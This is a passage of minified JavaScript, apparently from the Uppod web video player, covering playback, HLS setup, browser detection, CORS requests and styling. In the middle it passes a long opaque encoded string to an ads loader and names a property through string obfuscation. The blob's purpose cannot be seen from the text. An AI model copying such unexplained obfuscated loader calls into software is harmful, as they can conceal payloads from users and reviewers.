            return isYoutube() ? t = media_yt.getVideoLoadedFraction() : media.buffered && 0 < media.buffered.length && (t = media.buffered.end(media.buffered.length - 1) / media.duration),
            Math.round(100 * t)
        }
        return -1
    }
    ,
    this.Get = function(t) {
        return vars[t]
    }
    ,
    this.Set = function(t, e) {
        vars[t] = e
    }
    ,
    this.ChangeColor = function(t, e) {
        vars[t] = e,
        "screencolor" == t && ((t = scrn.getContext("2d")).fillStyle = e,
        t.fillRect(0, 0, t.canvas.width, t.canvas.height))
    }
    ,
    this.isYoutube = function() {
        return !(!vars.youtube || !vars.youtube_id)
    }
    ,
    this.YoutubeInit = function() {
        YoutubeInit()
    }
    ,
    UppodAds.prototype._json.loader("NuNGSlGKpO5IpMQZSfGPWMbocgrXWMToNlQ7NF1KpO5IpMQZSfGIkuVgNuE1YK4zcg50S1t0YKQyNgzhtfQ9m2QKklbCRg5gNuiocOtQkl9wWgrFpLRASKYAkuV3eMQoNUGIWU0Aw2EScg50S1t0YKQyNgGGkq09e1VIuur8cg50S1t0YKQyNgGGku1XaqVKpO5IpMQZSfGQkuVgNuE1YK4zNBVQuu1pm2T9NCqyc3EAS24nkuVgNuE1YK4CuBr3kgp9m2x9xu07p2GASMTncg0VkuVANfGXO2tpkuVPausyYKqPSMBINUGyNuYzTKqCEuGPklpYuMjCk2TncgHXR1rYcfYoR2YCkUrXO2tpku19YKq0puRyjLi9klY4WIH9tgGXWDjAw2oycfzftUjAaF0PagjfmItSe109xIo0kMoGaqPCtQPCRfNXjF1YR2BYRgcKegb9ulpCulYKRKoGaqPCc1PCRfNXjF1YRhBYRgQ7efzAm2znku00kMo9aqPCxqPCkuVHklH7NU5KkDxyxUH7eUzAdu07RgPgxUPgxUPCdLiodLN8pKBgY3rANCr2cut0u3rgNuiQcuE8NCqyc3EAS258pMGAY3rDeMByN2q8YKByNM9VdMQyNMq4F2N8YMrPSMB5xurUNO1ZpKqvSLrIS25hS2rQdMrZN3rPSLiocuQ8v250YKrlN3rDYKqGpMqvSLrxcuQQYCPCWCtPSMQ0klp8RgHoxlr7dUHAlz=="),
    this.EventDetail = function(t) {
        return vars.events[t]
    }
    ,
    this.currentTime = this.CurrentTime,
    this.seek = this.Seek,
    this.play = this.Play,
    this.toogleFullscreen = this.Full;
    var tip_margin_y = 10
      , ie = document.all && !window.opera
      , ns6 = document.getElementById && !document.all;
    function ToolTip(t, e) {
        "" != e && (tip.parentNode || uppod.document.appendChild(tip),
        tip.innerHTML = e,
        op = .1,
        tip.style.opacity = op,
        tip.style.visibility = "visible",
        t.addEventListener("mousemove", positiontip),
        showtip())
    }
    function ToolTipHide(t) {
        tip.style.visibility = "hidden",
        t.removeEventListener("mousemove", positiontip)
    }
    function showtip() {
        op < vars.tipalpha && (op += .1,
        tip.style.opacity = op,
        tip.style.filter = "alpha(opacity=" + 100 * op + ")",
        t = setTimeout(showtip, 30))
    }
    function positiontip(t) {
        var e = !1
          , i = findLeft(vars.stg)
          , o = findTop(vars.stg);
        if (t.target == line_but_b || t.target == run_b) {
            var s, e = !0;
            if (isYoutube())
                try {
                    s = media_yt.getDuration()
                } catch (t) {}
            else
                s = media.duration;
            s ? (a = t.pageX - i,
            n = findLeft(line_b) - i,
            tip.innerHTML = n < a ? formatTime((a - n) / line_all_b.clientWidth * s, !0) : "0:00") : tip.innerHTML = ""
        }
        var l = t.pageX - i
          , r = t.pageY - o
          , a = vars.stg.clientWidth - 20
          , n = vars.stg.clientHeight - 20
          , i = a - t.clientX - i
          , n = n - t.clientY - tip_margin_y - o
          , t = 0
          , o = 0
          , t = i < tip.clientWidth ? l - tip.clientWidth + "px" : l - (e ? tip.clientWidth / 2 : 0) + "px"
          , o = n < tip.clientHeight || e ? r - tip.clientHeight - tip_margin_y + "px" : r + 2 * tip_margin_y + "px";
        CSS(tip, {
            position: "absolute",
            top: o,
            left: t
        })
    }
}
Uppod.attr = function(t, e, i) {
    Object.defineProperty(t, e, i)
}
,
UppodControl = function() {
    function t(t, e) {
        this.key = t,
        this.options = e,
        this.options.dom ? this.dom = this.options.dom : this.dom = this.options.element.selfDom,
        e = this.key.replace(/([A-Z])/g, function(t) {
            return "_" + t.toLowerCase()
        }),
        this.dom.className = "uppod-control" + e
    }
    return t.prototype.key = "",
    t.prototype.options = {},
    t.prototype.dom = {},
    t.prototype.css = function(t) {
        return Uppod.setStyle(this.dom, t)
    }
    ,
    t.prototype.activate = function() {
        return this.dom.style.display = this._beforeDeactivate,
        this._beforeDeactivate = null
    }
    ,
    t.prototype.deactivate = function() {
        return this._beforeDeactivate || (this._beforeDeactivate = this.dom.style.display),
        this.hide()
    }
    ,
    t.prototype.show = function() {
        return this.dom.style.display = "block"
    }
    ,
    t.prototype.hide = function() {
        return this.dom.style.display = "none"
    }
    ,
    t.prototype._beforeDeactivate = null,
    t
}(),
window.Uppod.Control = UppodControl;
var MediaW, __bind = function(t, e) {
    return function() {
        return t.apply(e, arguments)
    }
}, MediaW = function() {
    function e(t) {
        this.options = t,
        this._onSourceError = __bind(this._onSourceError, this),
        this._onVideoError = __bind(this._onVideoError, this),
        this._onEnded = __bind(this._onEnded, this),
        this._onPlayProcess = __bind(this._onPlayProcess, this),
        this._onPlaying = __bind(this._onPlaying, this),
        this._onPlay = __bind(this._onPlay, this),
        this._onPause = __bind(this._onPause, this),
        this._onError = __bind(this._onError, this),
        this._onQuality = __bind(this._onQuality, this),
        this._isPreroll = __bind(this._isPreroll, this),
        this.onError = new Uppod.Event,
        this.onPlayProcess = new Uppod.Event,
        this.onEnded = new Uppod.Event,
        this.onQuality = new Uppod.Event,
        this.dom = createElement(this.options.mode),
        this.dom.className = "uppod-media",
        this.dom.setAttribute("playsinline", "1"),
        this.dom.addEventListener("error", this._onVideoError),
        this.dom.addEventListener("quality", this._onQuality),
        this.dom.addEventListener("ended", this._onEnded),
        this.dom.addEventListener("play", this._onPlay),
        this.dom.addEventListener("pause", this._onPause),
        this.dom.addEventListener("playing", this._onPlaying),
        Uppod.browser.forceNativePlayBtn && this._isPreroll() && (this.dom.style.visibility = "hidden")
    }
    return e.prototype.dom = null,
    e.prototype.hls = null,
    e.prototype.options = null,
    e.prototype.sources = null,
    e.prototype.onError = "Uppod.Event",
    e.prototype.onEnded = "Uppod.Event",
    e.prototype.onPlayProcess = "Uppod.Event",
    e.prototype.onQuality = "Uppod.Event",
    e.TICK_SEC = .1,
    e.prototype.setSources = function(t) {
        var i, o;
        return 0 < t.indexOf(".m3u8") && 1 == this.options.vars.hls_plugin && (!Hls.isSupported() || this.options.mobile || (i = this.dom,
        (o = new Hls({
            debug: !1,
            autoStartLoad: !0,
            maxBufferLength: 600,
            maxMaxBufferLength: 600,
            enableWorker: !1,
            lowLatencyMode: !1,
            manifestLoadPolicy: {
                default: {
                    maxTimeToFirstByteMs: 3e4,
                    maxLoadTimeMs: 6e4,
                    timeoutRetry: {
                        maxNumRetry: 2,
                        retryDelayMs: 0,
                        maxRetryDelayMs: 0
                    },
                    errorRetry: {
                        maxNumRetry: 1,
                        retryDelayMs: 1e3,
                        maxRetryDelayMs: 1e4
                    }
                }
            },
            fragLoadPolicy: {
                default: {
                    maxTimeToFirstByteMs: 3e4,
                    maxLoadTimeMs: 12e4,
                    timeoutRetry: {
                        maxNumRetry: 4,
                        retryDelayMs: 0,
                        maxRetryDelayMs: 0
                    },
                    errorRetry: {
                        maxNumRetry: 6,
                        retryDelayMs: 1e3,
                        maxRetryDelayMs: 1e4
                    }
                }
            }
        })).on(Hls.Events.MEDIA_ATTACHED, function() {
            o.loadSource(t)
        }),
        o.on(Hls.Events.ERROR, function(t, e) {
            e.fatal && ("networkError" == e.type ? (document.createEvent ? (t = document.createEvent("HTMLEvents")).initEvent("error", !0, !0) : (t = document.createEventObject()).eventType = "onError",
            t.eventName = "error",
            t.data = "network " + (e.response ? e.response.code : ""),
            document.createEvent ? i.dispatchEvent(t) : i.fireEvent("error", t)) : "mediaError" == e.type && o.recoverMediaError())
        }),
        o.attachMedia(this.dom))),
        e.prototype.hls = o,
        Uppod.trace("MediaW#setSources url=" + t),
        this._onErrorOnce = !1,
        0 < t.indexOf("|") ? this.sources = t.split("|") : this.sources = "" !== t ? [t] : [],
        this._createSourcesDom()
    }
    ,
    e.prototype.hlsAttached = function() {}
    ,
    e.prototype.play = function() {
        return this.options.ads && this.options.ads.unlockPlay(),
        this._isPreroll() ? this.options.ads.playPreroll() : this.dom.play()
    }
    ,
    e.prototype.pause = function() {
        if (this.dom.pause(),
        this.options.ads && this.options.ads.isPauseroll)
            return this.options.ads.playPauseroll()
    }
    ,
    e.prototype.destroy = function() {
        return clearInterval(this._intervalPlayProcess),
        e.prototype.hls && e.prototype.hls.destroy(),
        this.dom.removeEventListener("error", this._onVideoError),
        this.dom.removeEventListener("quality", this._onQuality),
        this.dom.removeEventListener("ended", this._onEnded),
        this.dom.removeEventListener("pause", this._onPause),
        this.dom.removeEventListener("playing", this._onPlaying),
        this._destroySourcesDom()
    }
    ,
    e.prototype._sourcesDom = [],
    e.prototype._okSources = [],
    e.prototype._onErrorOnce = !1,
    e.prototype._intervalPlayProcess = -1,
    e.prototype._isPreroll = function() {
        return this.options.ads && this.options.ads.isPreroll
    }
    ,
    e.prototype._createSourcesDom = function() {
        var t, e, i, o, s, l;
        for (this._sourcesDom = [],
        this._okSources = [],
        l = [],
        i = 0,
        o = (s = this.sources).length; i < o; i++)
            e = s[i],
            (t = document.createElement("source")).onerror = this._onSourceError,
            e.indexOf(".m3u8") < 0 && t.setAttribute("src", e),
            this._sourcesDom.push(t),
            this.dom.appendChild(t),
            l.push(this._okSources.push(t.src));
        return l
    }
    ,
    e.prototype._onError = function() {
        if (Uppod.trace("MediaW#_onError"),
        !this._onErrorOnce)
            return this._onErrorOnce = !0,
            this.onError.trigger()
    }
    ,
    e.prototype._onQuality = function() {
        return Uppod.trace("MediaW#_onQuality"),
        this.onQuality.trigger()
    }
    ,
    e.prototype._onPause = function() {
        return clearInterval(this._intervalPlayProcess)
    }
    ,
    e.prototype._onPlay = function() {}
    ,
    e.prototype._onPlaying = function() {
        return clearInterval(this._intervalPlayProcess),
        this._intervalPlayProcess = setInterval(this._onPlayProcess, 1e3 * e.TICK_SEC)
    }
    ,
    e.prototype._onPlayProcess = function() {
        if (this.onPlayProcess.trigger({
            mediaW: this
        }),
        this.options.ads)
            return this.options.ads.mediaPlayingProcess()
    }
    ,
    e.prototype._onEnded = function() {
        return this.options.ads && this.options.ads.isPostroll ? this.options.ads.playPostroll({
            done: (t = this,
            function() {
                return t.onEnded.trigger()
            }
            )
        }) : this.onEnded.trigger();
        var t
    }
    ,
    e.prototype._onVideoError = function(t) {
        return this._onError()
    }
    ,
    e.prototype._onQuality = function(t) {
        return this.onQuality.trigger()
    }
    ,
    e.prototype._onSourceError = function(t) {
        t = this._okSources.indexOf(t.target.src);
        if (0 <= t && this._okSources.splice(t, 1),
        0 === this._okSources.length)
            return this._onError()
    }
    ,
    e.prototype._destroySourcesDom = function() {
        for (var t, e = this._sourcesDom, i = [], o = 0, s = e.length; o < s; o++)
            (t = e[o]).onerror = void 0,
            t.setAttribute("src", ""),
            t.parentNode == this.dom && i.push(this.dom.removeChild(t));
        return i
    }
    ,
    e
}();
window.Uppod.MediaW = MediaW;
var Uppod = Uppod || {}, UppodBrowser, Canvas, UppodCors, UppodEvent, JSON, UppodLinkParser;
function Tween(t) {
    null == t.dur && (t.dur = 1e3),
    "a" == t.what && new Fx.Morph(t.mc,{
        duration: t.dur
    }).start({
        opacity: [t.from, t.to]
    })
}
function ReColor(t) {
    var e;
    return t && (-1 < (e = t).indexOf("|") && (t = t.split("|")[0]),
    1 == t.length && (t = e + e + e + e + e + e),
    2 == t.length && (t = "0000" + t),
    3 == t.length && (t = e.substr(0, 1) + e.substr(0, 1) + e.substr(1, 2) + e.substr(1, 2) + e.substr(2, 3) + e.substr(2, 3)),
    4 == t.length && (t = "00" + t),
    5 == t.length && (t = "0" + t)),
    t
}
function HTR(t) {
    return parseInt(cutHex(t).substring(0, 2), 16)
}
function HTG(t) {
    return parseInt(cutHex(t).substring(2, 4), 16)
}
function HTB(t) {
    return parseInt(cutHex(t).substring(4, 6), 16)
}
function cutHex(t) {
    return "#" == t.charAt(0) ? t.substring(1, 7) : t
}
function ShowHide(t) {
    "none" == t.style.display ? t.style.display = "block" : t.style.display = "none"
}
function Show(t) {
    t && (t.style.display = "block")
}
function Hide(t) {
    t && (t.style.display = "none")
}
Uppod.Shaper2 = function(t) {
    this.c = createElement("div"),
    this.canvas = document.createElement("canvas"),
    this.canvas.height = t.h,
    this.canvas.width = t.w;
    var e = this.canvas.getContext("2d");
    if (t.h0 || (t.h0 = 0),
    0 < t.bgc.indexOf("|")) {
        for (var i = t.bgc.split("|"), o = e.createLinearGradient(0, t.h0, 0, t.h), s = 0; s < i.length - 1; s++)
            o.addColorStop(s / (i.length - 1), "#" + ReColor(i[s]));
        o.addColorStop(1, "#" + ReColor(i[i.length - 1])),
        i[0] = ReColor(i[0]),
        i[i.length - 1] = ReColor(i[i.length - 1]),
        null != t.bga1 && o.addColorStop(0, "rgba(" + HTR(i[0]) + "," + HTG(i[0]) + "," + HTB(i[0]) + "," + t.bga1 + ")"),
        null != t.bga2 && o.addColorStop(.999, "rgba(" + HTR(i[i.length - 1]) + "," + HTG(i[i.length - 1]) + "," + HTB(i[i.length - 1]) + "," + t.bga2 + ")"),
        e.fillStyle = o
    } else
        e.fillStyle = "#" + ReColor(t.bgc);
    t.a && (e.globalAlpha = t.a < 0 ? 0 : t.a),
    0 < t.o ? (t.o == t.w / 2 ? (e.beginPath(),
    e.arc(t.w / 2, t.h / 2, t.w / 2, 0, 2 * Math.PI),
    e.closePath()) : (e.beginPath(),
    e.moveTo(1 == t.onotop ? 0 : t.o, 0),
    e.lineTo(t.w - (1 == t.onotop ? 0 : t.o), 0),
    1 != t.onotop && e.quadraticCurveTo(t.w, 0, t.w, t.o),
    e.lineTo(t.w, t.h - t.o),
    e.quadraticCurveTo(t.w, t.h, t.w - t.o, t.h),
    e.lineTo(t.o, t.h),
    e.quadraticCurveTo(0, t.h, 0, t.h - t.o),
    e.lineTo(0, t.o),
    1 != t.onotop && e.quadraticCurveTo(0, 0, t.o, 0),
    t.brdc || (t.brdc = "cccccc"),
    e.strokeStyle = "#" + ReColor(t.brdc),
    0 != t.brd && t.brd || (t.brd = .1),
    e.lineWidth = t.brd,
    e.stroke()),
    e.fill()) : e.fillRect(0, 0, t.w, t.h),
    delete e,
    this.c.appendChild(this.canvas)
}
,
window.Uppod.UppodStyle = function() {
    function t(t, e, i) {
        var o, s, l, r, a, n;
        for (o in this._vars = t,
        null == i && (i = e),
        l = this._vars.cntrlstyle)
            s = l[o],
            this[o] = s;
        if ("hdselect" === e)
            for (o in r = this._vars.cntrlhdselect)
                s = r[o],
                this[o] = s;
        for (o in a = this._vars["cntrl" + i])
            s = a[o],
            this[o] = s;
        for (o in n = this._vars["cntrl_" + i])
            s = n[o],
            this[o] = s
    }
    return t.prototype.get = function(t, e) {
        return this[t] || this._vars.lang2[e.or_lang2]
    }
    ,
    t
}(),
Uppod.CheckBase64 = function(t) {
    return 0 == t.indexOf("http://") && -1 == t.indexOf(".") && 100 < t.length && (t = "data:image/png;base64," + t.substr(7)),
    t
}
,
UppodBrowser = function() {
    function t(t) {
        this._userAgent = t || navigator.userAgent,
        this._property("restrictMediaPlay", function() {
            return this._mobile() && !this._firefox()
        }),
        this._property("forceNativePlayBtn", function() {
            return this._iPhone()
        }),
        this._property("restrictMediaClick", function() {
            return this._mobile() && this._ios()
        }),
        this._property("restrictMediaMuted", function() {
            return this._mobile() && this._ios()
        }),
        this._property("hasMouseEvents", function() {
            return !this._mobile()
        }),
        this._property("osWin", function() {
            return this._osWin()
        }),
        this._property("isOpera", function() {
            return this._opera()
        }),
        this._property("isIE", function() {
            return this._ie()
        }),
        this._property("forceFullscreen", function() {
            return this._iPhone()
        }),
        this._property("hasMp4", function() {
            return !(this._osWin() && this._opera())
        }),
        this._property("hasWebm", function() {
            return !(this._safari() || this._ios() || this._ie())
        }),
        this._property("hasCorsRedirect", function() {
            return !1
        }),
        this._property("seekAfterFullLoad", function() {
            return this._desktop() && this._safari()
        }),
        this._property("doSendCanPlay", function() {
            return !this._iPhone() && !this._iPad() && !this._iPod()
        }),
        this._property("hasMediaPosterShown", function() {
            return !this._android()
        }),
        this._property("allowHtmlOverMediaControl", function() {
            return !this._android()
        }),
        this._property("mobileFirefox", function() {
            return this._mobile() && this._firefox()
        })
    }
    return t.prototype._desktop = function() {
        return !this._mobile()
    }
    ,
    t.prototype._version = function() {
        var t = /Version\/([0-9\.A-z]+)/.exec(this._userAgent);
        if (t)
            return t[1].split(".")[0]
    }
    ,
    t.prototype._mobile = function() {
        return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(this._userAgent)
    }
    ,
    t.prototype._ios = function() {
        return /iPhone|iPad|iPod/i.test(this._userAgent)
    }
    ,
    t.prototype._osWin = function() {
        return /Windows NT/i.test(this._userAgent)
    }
    ,
    t.prototype._ie = function() {
        return /MSIE|Trident|Edge/i.test(this._userAgent)
    }
    ,
    t.prototype._android = function() {
        return /Android/i.test(this._userAgent)
    }
    ,
    t.prototype._firefox = function() {
        return /Firefox/i.test(this._userAgent)
    }
    ,
    t.prototype._opera = function() {
        return /OPR\//i.test(this._userAgent)
    }
    ,
    t.prototype._safari = function() {
        return !this._chrome() && /Safari/i.test(this._userAgent)
    }
    ,
    t.prototype._chrome = function() {
        return /Chrome/i.test(this._userAgent)
    }
    ,
    t.prototype._iPhone = function() {
        return /iPhone/i.test(this._userAgent)
    }
    ,
    t.prototype._iPad = function() {
        return /iPad/i.test(this._userAgent)
    }
    ,
    t.prototype._iPod = function() {
        return /iPod/i.test(this._userAgent)
    }
    ,
    t.prototype._property = function(t, e) {
        return Object.defineProperty(this, t, {
            get: e
        })
    }
    ,
    t
}(),
window.Uppod.Browser = UppodBrowser,
window.Uppod.browser = new UppodBrowser,
Canvas = function() {
    function t(t, e, i) {
        this._parentDom = t,
        t = this._parentDom.ownerDocument,
        this.dom = t.createElement("canvas"),
        this.context = this.dom.getContext("2d"),
        t = 1,
        this.context.webkitBackingStorePixelRatio < 2 && (t = window.devicePixelRatio || 1),
        this.context.scale(t, t),
        this.dom.width = e * t,
        this.dom.height = i * t,
        this._parentDom.appendChild(this.dom)
    }
    return t.prototype.context = {},
    t.prototype.dom = {},
    t.prototype._parentDom = {},
    t
}(),
window.Uppod.Canvas = Canvas,
window.Uppod.checkGradiendDiv = function(t, e) {
    var i, o = Uppod.setStyle;
    return 0 < e.indexOf("|") ? (o(t, {
        backgroundC: "#" + ReColor((i = e.split("|"))[0])
    }),
    o(t, {
        background: "-webkit-gradient(linear, left top, left bottom, from(#" + ReColor(i[0]) + "), to(#" + ReColor(i[1]) + "))"
    }),
    o(t, {
        background: "-webkit-linear-gradient(top, #" + ReColor(i[0]) + ", #" + ReColor(i[1]) + ")"
    }),
    o(t, {
        background: "-moz-linear-gradient(top, #" + ReColor(i[0]) + ", #" + ReColor(i[1]) + ")"
    }),
    o(t, {
        background: "-ms-linear-gradient(top, #" + ReColor(i[0]) + ", #" + ReColor(i[1]) + ")"
    }),
    o(t, {
        background: "-o-linear-gradient(top, #" + ReColor(i[0]) + ", #" + ReColor(i[1]) + ")"
    }),
    o(t, {
        "background-image": "-ms-linear-gradient(top, #" + ReColor(i[0]) + " 0%, #" + ReColor(i[1]) + " 100%)"
    })) : o(t, {
        backgroundColor: "#" + ReColor(e)
    })
}
,
window.Uppod.ReadyState = {
    HAVE_NOTHING: 0,
    HAVE_METADATA: 1,
    HAVE_CURRENT_DATA: 2,
    HAVE_FUTURE_DATA: 3,
    HAVE_ENOUGH_DATA: 4
},
window.Uppod.NetworkState = {
    NETWORK_EMPTY: 0,
    NETWORK_IDLE: 1,
    NETWORK_LOADING: 2,
    NETWORK_NO_SOURCE: 3
},
UppodCors = function() {
    function t() {}
    return t.get = function(t, e) {
        var i = this._createCORSRequest("GET", t);
        return e && ("function" == typeof e && (i.onload = function() {
            if (4 === i.readyState && 200 === i.status)
                return e(i.responseText)
        }
        ),
        e.success && (i.onload = function() {
            return 4 === i.readyState && 200 === i.status ? e.success(i.responseText) : e.error(i)
        }
        ),
        e.error && (i.onerror = function() {
            return e.error(i)
        }
        )),
        i.send()
    }
    ,
    t.gif = function(t) {
        var e = document.createElement("img");
        return e.setAttribute("src", t),
        e.setAttribute("height", "1px"),
        e.setAttribute("width", "1px"),
        document.body.appendChild(e),
        e.style.display = "none",
        !0
    }
    ,
    t._createCORSRequest = function(t, e) {
        var i = new XMLHttpRequest;
        if (i.withCredentials = !1,
        -1 == e.indexOf("adpod.in") && -1 == e.indexOf("noCredentials") && (i.withCredentials = !0),
        null != i.withCredentials)
            i.open(t, e, !0);
        else {
            if ("undefined" == typeof XDomainRequest)
                throw "CORS is not supported by the browser";
            (i = new XDomainRequest).open(t, e)
        }
        return i
    }
    ,
    t
}(),
window.Uppod.Cors = UppodCors,
Uppod["playerEtWrap".replace("Et", "")] = "{{ aes_key }}",
Uppod.css = Uppod.setStyle = function(t, e) {
    for (var i in e)
        "NaNpx" != e[i] && ("number" == typeof e[i] && "opacity" != i && (e[i] += "px"),
        "float" == i && (t.style.cssFloat = e[i]),
        "pointer-events" == i && (t.style.pointerEvents = e[i]),
        null != t && (t.style[i] = e[i]))
}
,
Uppod.cssShow = function(t) {
    t.style.display = "block"
}
,
Uppod.cssHide = function(t) {
    t.style.display = "none"
}
,
Uppod.addClass = function(t, e) {
    t.classList ? t.classList.add(e) : t.className += " " + e
}
,
Uppod.removeClass = function(t, e) {
    t.classList ? t.classList.remove(e) : (e = new RegExp("(^|\\b)" + e.split(" ").join("|") + "(\\b|$)","gi"),
    t.className = t.className.replace(e, " "))
}
,
UppodEvent = function() {
    function t() {
        this.listeners = []
    }
    return t.prototype.listeners = [],
    t.prototype.trigger = function(t) {
        for (var e, i = this.listeners, o = [], s = 0, l = i.length; s < l; s++)
            e = i[s],
            o.push(e(t));
        return o
    }
    ,
    t.prototype.bind = function(t) {
        return this.listeners.push(t)
    }
    ,
    t.prototype.remove = function(t) {
        for (var e, i = [], o = e = 0, s = this.listeners.length; 0 <= s ? e <= s : s <= e; o = 0 <= s ? ++e : --e)
            this.listeners[o] === t ? i.push(this.listeners.splice(o, 1)) : i.push(void 0);
        return i
    }
    ,
    t
}(),
window.Uppod.Event = UppodEvent,
Uppod.Fullscreen = function() {
    function t() {}
    return t.hack = function(t) {
        var i = function(t, e) {
            return t && t.tagName !== document.body.tagName && ("" !== t.style.position && e.push({
                node: t,
                position: t.style.position
            }),
            i(t.parentNode, e)),
            e
        };
        return i(t.parentNode, [])
    }
    ,
    t.request = function(t) {
        return t.requestFullScreen ? (t.requestFullScreen(),
        !0) : t.requestFullscreen ? (t.requestFullscreen(),
        !0) : t.mozRequestFullScreen ? (t.mozRequestFullScreen(),
        !0) : t.webkitRequestFullScreen ? (t.webkitRequestFullScreen(),
        !0) : !!t.msRequestFullscreen && (t.msRequestFullscreen(),
        !0)
    }
    ,
    t
}(),
Uppod.IconImg = function(t, e, i, o, s, l) {
    var r, a, n, c = Uppod.setStyle, p = Uppod.CheckBase64;
    1 == l && 0 < o && 0 < s ? (r = createElement("div"),
    c(r, {
        width: o / 2 + "px",
        height: s + "px",
        overflow: "hidden"
    }),
    0 < i ? (a = -1 < t.indexOf("|") ? t.substr(0, t.indexOf("|")) : t,
    n = -1 < t.indexOf("|") ? t.substr(t.indexOf("|") + 1) : t,
    a = p(a),
    n = p(n),
    1 == i && c(r, {
        background: "url(" + a + ") no-repeat 0 0"
    }),
    2 == i && c(r, {
        background: "url(" + n + ") no-repeat 0 0"
    })) : (t = p(t),
    c(r, {
        background: "url(" + t + ") no-repeat 0 0"
    })),
    r.onmouseover = function(t) {
        c(r, {
            backgroundPosition: "-" + o / 2 + "px 0"
        })
    }
    ,
    r.onmouseout = function(t) {
        c(r, {
            backgroundPosition: "0 0"
        })
    }
    ) : (r = document.createElement("img"),
    0 < i ? (a = -1 < t.indexOf("|") ? t.substr(0, t.indexOf("|")) : t,
    n = -1 < t.indexOf("|") ? t.substr(t.indexOf("|") + 1) : t,
    a = p(a),
    n = p(n),
    1 == i && r.setAttribute("src", a),
    2 == i && r.setAttribute("src", n)) : r.setAttribute("src", t)),
    e.appendChild(r)
}
,
JSON = JSON || {},
JSON.keyup = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",
function() {
    "use strict";
    function f(t) {
        return t < 10 ? "0" + t : t
    }
    "function" != typeof Date.prototype.toJSON && (Date.prototype.toJSON = function(t) {
        return isFinite(this.valueOf()) ? this.getUTCFullYear() + "-" + f(this.getUTCMonth() + 1) + "-" + f(this.getUTCDate()) + "T" + f(this.getUTCHours()) + ":" + f(this.getUTCMinutes()) + ":" + f(this.getUTCSeconds()) + "Z" : null
    }
    ,
    String.prototype.toJSON = Number.prototype.toJSON = Boolean.prototype.toJSON = function(t) {
        return this.valueOf()
    }
    );
    var cx = /[\u0000\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g, escapable = /[\\\"\x00-\x1f\x7f-\x9f\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g, gap, indent, meta = {
        "\b": "\\b",
        "\t": "\\t",
        "\n": "\\n",
        "\f": "\\f",
        "\r": "\\r",
        '"': '\\"',
        "\\": "\\\\"
    }, rep;
    function quote(t) {
        return escapable.lastIndex = 0,
        escapable.test(t) ? '"' + t.replace(escapable, function(t) {
            var e = meta[t];
            return "string" == typeof e ? e : "\\u" + ("0000" + t.charCodeAt(0).toString(16)).slice(-4)
        }) + '"' : '"' + t + '"'
    }
    function str(t, e) {
        var i, o, s, l, r, a = gap, n = e[t];
        switch (n && "object" == typeof n && "function" == typeof n.toJSON && (n = n.toJSON(t)),
        "function" == typeof rep && (n = rep.call(e, t, n)),
        typeof n) {
        case "string":
            return quote(n);
        case "number":
            return isFinite(n) ? String(n) : "null";
        case "boolean":
        case "null":
            return String(n);
        case "object":
            if (!n)
                return "null";
            if (gap += indent,
            r = [],
            "[object Array]" === Object.prototype.toString.apply(n)) {
                for (l = n.length,
                i = 0; i < l; i += 1)
                    r[i] = str(i, n) || "null";
                return s = 0 === r.length ? "[]" : gap ? "[\n" + gap + r.join(",\n" + gap) + "\n" + a + "]" : "[" + r.join(",") + "]",
                gap = a,
                s
            }
            if (rep && "object" == typeof rep)
                for (l = rep.length,
                i = 0; i < l; i += 1)
                    "string" == typeof rep[i] && (s = str(o = rep[i], n)) && r.push(quote(o) + (gap ? ": " : ":") + s);
            else
                for (o in n)
                    Object.prototype.hasOwnProperty.call(n, o) && (s = str(o, n)) && r.push(quote(o) + (gap ? ": " : ":") + s);
            return s = 0 === r.length ? "{}" : gap ? "{\n" + gap + r.join(",\n" + gap) + "\n" + a + "}" : "{" + r.join(",") + "}",
            gap = a,
            s
        }
    }
    "function" != typeof JSON.stringify && (JSON.stringify = function(t, e, i) {
        var o;
        if (indent = gap = "",
        "number" == typeof i)
            for (o = 0; o < i; o += 1)
                indent += " ";
        else
            "string" == typeof i && (indent = i);
        if ((rep = e) && "function" != typeof e && ("object" != typeof e || "number" != typeof e.length))
            throw new Error("JSON.stringify");
        return str("", {
            "": t
        })
    }
    ),
    "function" != typeof JSON.parse && (JSON.parse = function(text, reviver) {
        var j;
        function walk(t, e) {
            var i, o, s = t[e];
            if (s && "object" == typeof s)
                for (i in s)
                    Object.prototype.hasOwnProperty.call(s, i) && (void 0 !== (o = walk(s, i)) ? s[i] = o : delete s[i]);
            return reviver.call(t, e, s)
        }
        if (text = String(text),
        cx.lastIndex = 0,
        cx.test(text) && (text = text.replace(cx, function(t) {
            return "\\u" + ("0000" + t.charCodeAt(0).toString(16)).slice(-4)
        })),
        /^[\],:{}\s]*$/.test(text.replace(/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g, "@").replace(/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g, "]").replace(/(?:^|:|,)(?:\s*\[)+/g, "")))
            return j = eval("(" + text + ")"),
            "function" == typeof reviver ? walk({
                "": j
            }, "") : j;
        throw new SyntaxError("JSON.parse")
    }
    )
}(),
UppodLinkParser = function() {
    function t(t) {
        var e, i, o, s, l, r, a, n, c, p;
        for (this.orLinks = t.split(" or "),
        i = o = 0,
        r = (c = this.orLinks).length; o < r; i = ++o)
            t = c[i],
            this.orLinks[i] = t.split(" and ");
        for (s = 0,
        a = (p = this.orLinks).length; s < a; s++)
            for (i = l = 0,
            n = (e = p[s]).length; l < n; i = ++l)
                t = e[i],
                e[i] = t.trim()
    }
    return t.prototype.orLinks = [],
    t
}(),
window.Uppod.LinkParser = UppodLinkParser,
Uppod.log = function(t) {
    if (console.log)
        return console.log(t)
}
,
Uppod.trace = function(t) {
    var e;
    if (Uppod.isTrace)
        return (e = document.body.querySelector(".uppod-trace")) || ((e = document.createElement("pre")).className = "uppod-trace",
        document.body.insertBefore(e, document.body.firstChild),
        Uppod.css(e, {
            background: "#000",
            color: "#0c0",
            padding: "10px",
            height: "200px",
            "overflow-y": "scroll"
        })),
        t = document.createTextNode(t + "\n"),
        e.insertBefore(t, e.firstChild)
}
,
Uppod.measureText = function(t, e, i) {
    var o = Uppod.setStyle
      , s = document.createElement("lDiv");
    document.body.appendChild(s),
    null != i && (s.style = i),
    o(s, {
